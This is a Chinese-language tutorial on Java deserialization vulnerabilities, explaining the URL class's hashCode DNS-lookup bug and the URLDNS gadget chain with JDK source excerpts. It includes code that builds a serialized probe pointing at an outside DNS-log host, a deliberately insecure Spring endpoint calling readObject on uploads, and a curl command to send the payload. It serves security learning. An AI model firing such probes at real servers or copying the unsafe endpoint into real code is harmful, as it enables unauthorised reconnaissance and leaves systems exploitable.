Java反序列化漏洞 - 1.从URL类的⼀个bug 说起
1
Java反序列化漏洞 - 1.从URL类的
⼀个bug 说起
URL 类的⼀个远古bug
Java 的URL 类有个很好玩的bug，当你调⽤它的hashCode()⽅法时，会发起⼀次DNS 
解析。例如，当你往HashSet 添加⼀个URL元素时，会触发URL 的hashCode() ⽅法⽐较
元素，然后发出⼀个DNS 请求。
Java反序列化漏洞 - 1.从URL类的⼀个bug 说起
2
这个bug 源于URL 的⼀个错误实现，早在2001 年已经有⼈反馈给oracle，我们现在还能
在Oracle 的java bug 反馈平台看到当时的bug report 记录。
当时有好⼏个⼈同时反馈了这个问题， 其中⼀个表⽰：怎么我调⽤⼀个简单的
hashCode() ⽅法花了20秒？？！
以及：怎么我两个url 不⼀样，调⽤equals ⽐较返回true？？！
这是因为URL 类在计算hashCode 的时候，发起了DNS 请求获取ip，并且通过ip地址来
⽐较两个URL 对象是否equals。实现这⼀功能的⼯程师应该是这么想的，⽐较两个URL 
是否相等时应该⽐较它们的ip 地址。
oracle 收到bug 反馈后，最后的结论是不处理，因为需要向后兼容。但他们提供了⼀个新
的URI 类来避免这个问题。
Unfortunately, changing the behavior now would break backward 
compatibility in a serious way, plus Java Security mechanism 
Java反序列化漏洞 - 1.从URL类的⼀个bug 说起
3
depends on it in some parts of the implementation. We can't 
change it now.
这⼀错误实现看起来没有什么⽤处，没想到⼗多年后⽅便了安全研究⼈员。
反序列化简介
所以URL 类跟反序列化漏洞有什么关系？当然有关系。
下⾯先介绍⼀下反序列化。
简单来说，序列化就是把对象存到⽂件⾥，反序列化就是从⽂件⾥读取⼀个对象。代码运
⾏时对象是在内存⾥的，运⾏结束内存⾥的对象就没有了，为了可以持久化，需要存到⽂
件。
序列化：
Employee employee = new Employee(); 
FileOutputStream fileOutputStream = new FileOutputStream("/tmp/employee.ser"); 
ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); 
objectOutputStream.writeObject(employee); 
objectOutputStream.close(); 
fileOutputStream.close();
反序列化：
FileInputStream fileInputStream = new FileInputStream("/tmp/employee.ser"); 
ObjectInputStream objectInputStream= new ObjectInputStream(fileInputStream); 
Employee employee = (Employee) in.readObject(); 
objectInputStream.close(); 
fileInputStream.close();
写到⽂件⾥的是⼆进制数据。我们还可以使⽤readObject ⽅法和writeObject ⽅法来⾃
定义对象⾥的哪些内容需要序列化。
readObject 和writeObject 是约定俗成的⽅法，不是哪个接⼝⾥定义的⽅法。Java 在序列
化和反序列化时，会通过反射去寻找它们，如果存在会直接调⽤。
Java反序列化漏洞 - 1.从URL类的⼀个bug 说起
4
private void writeObject(ObjectOutputStream out) throws IOException; 
private void readObject(ObjectInputStream ins) throws IOException, ClassNotFoundException;
如果在反序列化调⽤readObject 的时候，readObject ⾥⾯有⼀些危险的代码，漏洞就形
成了。
以URL 类为例，⼀个以URL 为key 的HashMap，在反序列化时会调⽤URL 的hashCode 
⽅法，触发⼀个DNS 请求。
也就是说我们可以让⽬标服务器发⼀个DNS 请求，如果我们收到了这个dns ⽇志，可以
证明反序列化漏洞存在。
探测是否存在反序列化漏洞
我们可以⽤这个bug 来探测是否存在反序列化漏洞。
1.⾸先⽣成序列化⽂件
Map map = new HashMap<>(); 
URL url = new URL("http://xxxx.ceye.io");    
map.put(url, "test");  //这⾥就会触发⼀次dns 请求，可以通过设置SilentURLStreamHandler 或者设置has
hCode 来避免，为简单起⻅先忽略了 
try { 
    FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser"); 
    ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream); 
    outputStream.writeObject(map); 
    outputStream.close(); 
    fileOutputStream.close(); 
} catch (Exception e) { 
    e.printStackTrace(); 
}
2.写⼀个接⼝测试，接收到⽂件后调⽤readObject
@RestController 
public class DNSController { 
    @PostMapping(value = "/test") 
    public String test(@RequestParam("file") MultipartFile file) throws IOException, Class
NotFoundException { 
Java反序列化漏洞 - 1.从URL类的⼀个bug 说起
5
        ObjectInputStream inputStream = new ObjectInputStream(file.getInputStream()); 
        inputStream.readObject(); 
        inputStream.close(); 
        return "OK"; 
    } 
}
3.使⽤postman 或者curl 等⼯具测试
curl --location --request POST 'http://127.0.0.1:8080/test' \ 
--form 'file=@"/Users/xxxxxx/Desktop/urldns.ser"'
4.在DNS log 平台收到这个DNS 请求，证明漏洞存在
URLDNS 利⽤链原理分析
这⼀流程⼜被称为URLDNS 利⽤链。
下⾯我们通过阅读HashMap 和URL 的源码，来分析⼀下原理。
先从HashMap 的readObject 开始，可以看到使⽤循环读取key 和value，然后put 到Map 
⾥⾯。通过hash(key)⽅法 获取key 的hashCode，⽽hash ⽅法调⽤的是key 的
hashCode()  ⽅法，也就是URL 的hashCode ⽅法。
private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundExce
ption { 
    //已省略相关代码 
        // Read the keys and values, and put the mappings in the HashMap 
        for (int i = 0; i >> 16); 
}
Java反序列化漏洞 - 1.从URL类的⼀个bug 说起
6
URL 的hashCode ⽅法，在经过⼀系列调⽤后，调⽤InetAddress.getByName(host) 来
获取ip 地址。
getByName ⽅法还可以⼀步⼀步跟踪下去，最后实际调⽤是通过JNI 调⽤native ⽅法，
具体就不研究了，逻辑不外乎查看/etc/resolv.conf下配置的nameserver和/etc/hosts下⾯
的配置，然后使⽤DNS协议查询。
public synchronized int hashCode() { 
    if (hashCode != -1) 
        return hashCode; 
    hashCode = handler.hashCode(this); 
    return hashCode; 
} 
//跟踪URLStreamHandler 的hashCode ⽅法 
protected int hashCode(URL u) { 
   //省略 
    // Generate the host part. 
    InetAddress addr = getHostAddress(u); 
    //省略 
} 
protected synchronized InetAddress getHostAddress(URL u) { 
    if (u.hostAddress != null) 
        return u.hostAddress; 
    String host = u.getHost(); 
    if (host == null || host.equals("")) { 
        return null; 
    } else { 
        try { 
            u.hostAddress = InetAddress.getByName(host); 
        } catch (UnknownHostException ex) { 
            return null; 
        } catch (SecurityException se) { 
            return null; 
        } 
    } 
    return u.hostAddress; 
}
参考资料
Java反序列化-URLDNS
Java反序列化 — URLDNS利⽤链分析